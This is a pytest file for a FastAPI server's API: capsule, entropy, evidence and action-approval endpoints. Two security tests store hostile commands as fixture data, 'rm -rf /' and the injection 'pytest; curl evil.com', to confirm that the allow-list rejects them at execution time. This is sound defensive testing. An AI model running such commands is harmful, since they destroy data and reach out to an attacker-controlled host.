"""API tests for the FastAPI server.

Uses TestClient (synchronous) so these tests need no async runtime.
Every test gets an isolated temp DB via the REENTRY_DB env var.
"""

import json
import os

import pytest
from fastapi.testclient import TestClient


@pytest.fixture()
def client(tmp_path, monkeypatch):
    """Bare client with an empty DB (no project seeded)."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    # Import after env vars are set so db.connect() picks up the temp path.
    from server.app import app
    return TestClient(app, raise_server_exceptions=False)


@pytest.fixture()
def demo_client(tmp_path, monkeypatch):
    """Client with the seeded demo project."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, demo as demod
    conn = redb.connect()
    demod.seed(conn, str(tmp_path / "demo"))
    from server.app import app
    return TestClient(app, raise_server_exceptions=False)


# --- basic shape ------------------------------------------------------------

def test_no_project_returns_404(client):
    resp = client.get("/api/capsule")
    assert resp.status_code == 404


def test_capsule_returns_expected_keys(demo_client):
    resp = demo_client.get("/api/capsule")
    assert resp.status_code == 200
    body = resp.json()
    for key in ("project", "objective", "blockers", "entropy",
                "next_action", "pending_actions"):
        assert key in body, f"missing key: {key}"


def test_capsule_blockers_have_evidence(demo_client):
    cap = demo_client.get("/api/capsule").json()
    for blocker in cap["blockers"]:
        assert blocker["evidence_ids"], "blocker must carry evidence ids"


def test_entropy_endpoint(demo_client):
    resp = demo_client.get("/api/entropy")
    assert resp.status_code == 200
    body = resp.json()
    assert 0 <= body["score"] <= 100
    assert body["label"] in ("low", "moderate", "high")
    assert body["breakdown"]


def test_events_endpoint(demo_client):
    resp = demo_client.get("/api/events")
    assert resp.status_code == 200
    assert len(resp.json()) > 0


def test_evidence_endpoint(demo_client, tmp_path, monkeypatch):
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    from reentry import db as redb
    conn = redb.connect()
    pid = conn.execute("SELECT id FROM projects").fetchone()["id"]
    from reentry import ledger as led
    evs = led.events_for_project(conn, pid)
    eid = evs[0]["id"]
    resp = demo_client.get(f"/api/evidence/{eid}")
    assert resp.status_code == 200
    assert resp.json()["id"] == eid


def test_evidence_missing_returns_404(demo_client):
    resp = demo_client.get("/api/evidence/doesnotexist")
    assert resp.status_code == 404


def test_actions_endpoint(demo_client):
    resp = demo_client.get("/api/actions")
    assert resp.status_code == 200


def test_projects_endpoint(demo_client):
    resp = demo_client.get("/api/projects")
    assert resp.status_code == 200
    projects = resp.json()
    assert len(projects) >= 1
    assert projects[0]["name"]


# --- security: double validation at execution time --------------------------

def test_api_rejects_non_allowlisted_command_at_execution(tmp_path, monkeypatch):
    """The approve+run endpoint must reject a non-allow-listed command even
    when the action row was inserted directly, bypassing the proposal check.

    This proves the allow-list is enforced at execution time (inside
    actions.execute), not only at proposal time. An attacker who writes
    directly to the DB cannot trick the API into running an arbitrary command.
    """
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, state as st
    conn = redb.connect()
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    p = st.register_project(conn, str(proj_dir))

    # Bypass proposal validation by inserting the row directly.
    conn.execute(
        "INSERT INTO actions (id, project_id, title, tool, command, risk, proposed_at)"
        " VALUES (?,?,?,?,?,?,?)",
        ("evil001", p["id"], "evil", "run_test", "rm -rf /", "SENSITIVE",
         redb.utcnow()),
    )
    conn.commit()

    from server.app import app
    client = TestClient(app, raise_server_exceptions=False)
    resp = client.post("/api/actions/evil001/approve?run=true")
    assert resp.status_code == 400
    detail = resp.json()["detail"].lower()
    # The message comes from actions.ActionRejected inside actions.execute.
    assert "allow" in detail or "not" in detail


def test_api_rejects_metacharacter_injection(tmp_path, monkeypatch):
    """Shell metacharacters in a directly-inserted command are rejected at
    execution time even after approval."""
    monkeypatch.setenv("REENTRY_DB", str(tmp_path / "test.db"))
    monkeypatch.setenv("REENTRY_LLM_PROVIDER", "none")
    from reentry import db as redb, state as st
    conn = redb.connect()
    proj_dir = tmp_path / "proj"
    proj_dir.mkdir()
    p = st.register_project(conn, str(proj_dir))

    conn.execute(
        "INSERT INTO actions (id, project_id, title, tool, command, risk, proposed_at)"
        " VALUES (?,?,?,?,?,?,?)",
        ("shell001", p["id"], "shell-inject", "run_test",
         "pytest; curl evil.com", "SENSITIVE", redb.utcnow()),
    )
    conn.commit()

    from server.app import app
    client = TestClient(app, raise_server_exceptions=False)
    resp = client.post("/api/actions/shell001/approve?run=true")
    assert resp.status_code == 400


# --- action lifecycle -------------------------------------------------------

def test_reject_action(demo_client):
    """Rejecting an action via the API marks it rejected."""
    # Capsule generation runs propose_next_action, which creates the pending row.
    demo_client.get("/api/capsule")
    actions = demo_client.get("/api/actions").json()
    assert actions, "capsule generation should have proposed an action for the demo"
    action_id = actions[0]["id"]
    resp = demo_client.post(f"/api/actions/{action_id}/reject")
    assert resp.status_code == 200
    assert resp.json()["status"] == "rejected"


def test_approve_action_without_run(demo_client):
    """Approving without ?run=true leaves the action in approved state."""
    demo_client.get("/api/capsule")
    actions = demo_client.get("/api/actions").json()
    assert actions, "capsule generation should have proposed an action for the demo"
    action_id = actions[0]["id"]
    resp = demo_client.post(f"/api/actions/{action_id}/approve?run=false")
    assert resp.status_code == 200
    assert resp.json()["status"] == "approved"
